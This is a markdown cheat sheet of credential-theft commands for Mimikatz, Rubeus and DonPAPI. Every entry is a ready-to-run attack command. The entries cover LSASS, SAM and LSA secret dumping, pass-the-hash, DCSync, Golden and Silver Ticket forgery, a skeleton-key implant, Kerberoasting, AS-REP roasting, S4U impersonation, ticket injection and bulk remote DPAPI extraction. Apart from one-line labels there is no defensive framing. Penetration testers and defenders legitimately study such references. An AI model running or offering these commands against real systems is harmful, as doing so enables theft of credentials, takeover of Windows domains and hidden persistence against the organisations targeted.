# Credential Theft

_3 tool commands_

### Mimikatz  `mimikatz-tool`
_Windows credential extraction tool_

**Step 0**
> Obtain Debug privilege
_platform: windows_
```
privilege::debug
```

**Step 0**
> Dump all logon credentials
_platform: windows_
```
sekurlsa::logonpasswords
```

**Step 0**
> Extract from an LSASS dump file
_platform: windows_
```
sekurlsa::minidump lsass.dmp
```

**Step 0**
> Pass-the-Hash attack
_platform: windows_
```
sekurlsa::pth /user:Administrator /domain:domain.com /ntlm:HASH
```

**Step 0**
> DCSync to obtain the domain admin hash
_platform: windows_
```
lsadump::dcsync /domain:domain.com /user:Administrator
```

**Step 0**
> Dump the SAM database
_platform: windows_
```
lsadump::sam
```

**Step 0**
> Dump LSA secrets
_platform: windows_
```
lsadump::lsa /inject
```

**Step 0**
> Generate a Golden Ticket
_platform: windows_
```
kerberos::golden /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:HASH /user:Administrator /ptt
```

**Step 0**
> Generate a Silver Ticket
_platform: windows_
```
kerberos::golden /domain:domain.com /sid:S-1-5-21-xxx /target:server /service:cifs /rc4:HASH /user:Administrator /ptt
```

**Step 0**
> List Kerberos tickets
_platform: windows_
```
kerberos::list
```

**Step 0**
> Export Kerberos tickets
_platform: windows_
```
kerberos::list /export
```

**Step 0**
> Implant a skeleton key (master password)
_platform: windows_
```
misc::skeleton
```

---

### Rubeus  `rubeus-tool`
_Kerberos attack tool_

**Step 0**
> Kerberoasting attack
_platform: windows_
```
Rubeus.exe kerberoast /stats
```

**Step 0**
> AS-REP Roasting attack
_platform: windows_
```
Rubeus.exe asreproast /user:username
```

**Step 0**
> Request a TGT ticket
_platform: windows_
```
Rubeus.exe asktgt /user:username /password:password
```

**Step 0**
> Request a service ticket
_platform: windows_
```
Rubeus.exe asktgs /service:cifs/server.domain.com /ticket:TICKET_BASE64
```

**Step 0**
> S4U protocol attack
_platform: windows_
```
Rubeus.exe s4u /user:service_account /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target
```

**Step 0**
> Generate a Golden Ticket
_platform: windows_
```
Rubeus.exe golden /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:HASH /user:Administrator
```

**Step 0**
> Inject a ticket
_platform: windows_
```
Rubeus.exe ptt /ticket:TICKET_BASE64
```

**Step 0**
> List current tickets
_platform: windows_
```
Rubeus.exe klist
```

**Step 0**
> Monitor for new tickets
_platform: windows_
```
Rubeus.exe monitor /interval:30
```

---

### DonPAPI  `donpapi-tool`
_DPAPI credential extraction tool_

**Step 0**
> Extract DPAPI credentials
_platform: linux_
```
donpapi domain/user:password@target_ip
```

**Step 0**
> Authenticate using a hash
_platform: linux_
```
donpapi -hashes :NTHASH domain/user@target_ip
```

**Step 0**
> Bulk credential extraction
_platform: linux_
```
donpapi domain/user:password@targets.txt
```

---
